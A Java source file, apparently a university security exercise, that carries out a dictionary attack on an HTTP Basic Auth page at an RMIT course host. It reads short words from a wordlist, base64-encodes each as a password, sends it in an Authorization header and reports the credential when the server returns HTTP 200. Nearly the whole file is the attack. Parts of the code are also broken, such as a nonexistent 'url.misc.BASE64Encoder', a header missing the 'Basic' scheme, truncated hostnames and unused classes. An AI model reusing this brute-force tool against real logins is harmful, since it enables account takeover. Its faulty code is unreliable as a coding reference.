

import java.net.*;
import java.io.IOException;
import java.util.*;
import java.io.*;
public class Dictionary   {
  static String userName;
  static  URL   url;
  static URLAuthenticator  urlAuthenticator;
  static int noOfAttempts;
  
  public Dictionary() {
  }

  public static void main (String args[])  {
     Properties props = System.getProperties();
     props.put("http.proxyHost", "bluetongue.cs.rmit.edu.:8080");
     
     System.out.println(props.get("http.proxyHost"));
     BufferedReader inFile = null;
     
        try {
	          if (args.length < 1)  {       
		         System.out.println ("Usage  : java Dictionary /usr/share/lib/dict/words");
                         System.exit(1);
		  }	 
	    	  inFile = new BufferedReader (new FileReader(args[0]));



	    	  breakPassword(inFile);
		}
		
		catch (FileNotFoundException e) { 
		    System.err.println(e.getMessage());
		    System.exit(1);
                }
                catch (IOException e) {                  
                    System.err.println(e.getMessage());
                    System.exit(1);
         }
	 finally {
    	    try {
		     inFile.close();  

	         }
	    catch (IOException ex) {ex.printStackTrace();}  
	}

 }
 private static void  breakPassword (BufferedReader file) throws
 IOException {
     String password="  ";
     userName="";
     boolean found= false;
     MyHttpURLConnection    httpURLConnection;
     String passBase64=" ";
     urlAuthenticator =  new URLAuthenticator(userName);
     HttpURLConnection   u=null;
     String  input;
	try {
	       
	        url  = new URL ("http://sec-crack.cs.rmit.edu./SEC/2/index.php");
     	    
            } catch (MalformedURLException  e){
	    } catch  (IOException  io) {io.printStackTrace();}
	
        while (( input = file.readLine()) != null) {
	      if (input.length() <=3)   {
                  password = input;
		  password =":"+ password;
   	         
                  try {
                       u = (HttpURLConnection)url.openConnection();
		       passBase64 = new url.misc.BASE64Encoder().encode(password.getBytes());
                       u.setRequestProperty("Authorization", " " + passBase64);
			         

			
                       u.connect();
		       noOfAttempts++;	
		    if (u.getContentLength() != 0) {    
		       
		       if (u.getResponseCode() ==   HttpURLConnection.HTTP_OK  ) {
		          
	                   found=true;
   		          System.out.println("Your User Name : Password Combination is :"+password+ 
			  "   "+ " Found by  Thread");
			  System.out.println("   ");
			  System.out.println(" of Attempts / Requests "+ noOfAttempts);
			  
		          System.exit(0);
		       }	  
                      
		   }

		  } catch  (ProtocolException  px) {px.printStackTrace();
		  } catch (BindException e){e.printStackTrace();
		  } catch (IndexOutOfBoundsException  e3){e3.printStackTrace();
		  } catch  (IOException  io) {io.printStackTrace();
		  } finally {u.disconnect();
		  }
              }
        }
	
	
	
	
	
	
	
 }
}
class URLAuthenticator  extends Authenticator   {
   private String uName;
   String passwd;
   static private char[] password;
   public URLAuthenticator(String uName) {
     this.uName = uName;
   }
   public void setPassword(String passwd)  {

     this.passwd=passwd;
     password=passwd.toCharArray();

   }

   public PasswordAuthentication getPasswordAuthentication()  {

	 PasswordAuthentication passwordAuthentication = new PasswordAuthentication(uName,password);
 	 return  passwordAuthentication;
   }
}
class MyHttpURLConnection extends HttpURLConnection  {
    public MyHttpURLConnection(URL url) {
       super(url);
    }
    public void disconnect() {
    }
    public boolean usingProxy() {
        return true;
    }
    public void connect() {
    }
}


         


